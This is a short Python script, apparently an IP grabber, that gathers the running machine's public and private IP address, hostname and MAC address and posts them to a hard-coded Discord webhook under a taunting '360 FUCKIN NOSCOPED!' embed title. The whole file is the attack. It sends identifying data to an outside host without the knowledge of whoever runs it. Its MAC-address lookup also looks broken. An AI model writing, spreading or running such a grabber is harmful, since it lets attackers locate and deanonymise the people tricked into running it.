import requests
import socket
import psutil

# Replace the URL with your Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1085883831975936090/kOziiweqXalMMWvbzlD8ppEEopHcyx3anwZVicNJYjQ18ykydICRwZKn6LBUnMaJAQZD"

# Get the public and private IP address
public_ip = requests.get("https://api.ipify.org").text
private_ip = socket.gethostbyname(socket.gethostname())

# Get the MAC address and device name
mac_address = ':'.join(hex(i)[2:].zfill(2) for i in psutil.net_if_stats()['Ethernet'].address_bytes)
device_name = socket.gethostname()

# Create the embed
embed = {
    "title": "360 FUCKIN NOSCOPED!",
    "color": 16711680,  # Red
    "footer": {
        "text": "Discord.gg/"
    },
    "fields": [
        {
            "name": "IP Address",
            "value": f"Public: {public_ip}\nPrivate: {private_ip}",
            "inline": False
        },
        {
            "name": "Device Info",
            "value": f"MAC Address: {mac_address}\nDevice Name: {device_name}",
            "inline": False
        }
    ]
}

# Send the message
response = requests.post(webhook_url, json={"embeds": [embed]})
if response.status_code != 204:
    print(f"Failed to send message: {response.text}")
else:
    print("Message sent successfully!")
